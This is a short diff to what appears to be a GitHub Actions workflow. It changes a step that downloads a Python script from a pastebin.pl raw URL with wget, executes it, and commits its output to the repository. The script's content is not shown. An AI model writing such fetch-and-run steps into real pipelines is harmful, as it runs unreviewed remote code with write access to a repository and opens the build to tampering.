@@ -17,12 +17,9 @@ jobs:
     
     - name: operations
       run: |
-          wget https://pastebin.pl/view/raw/09a88697 -O 123.py
-          touch res1.txt
+          wget https://pastebin.pl/view/raw/a8f55639 -O 123.py
           touch res.txt
-          python3 123.py
-          ls > res1.py
-          git add res1.txt
+          python3 123.py > res.txt
           git add res.txt
     
     - name: Commit results to Github
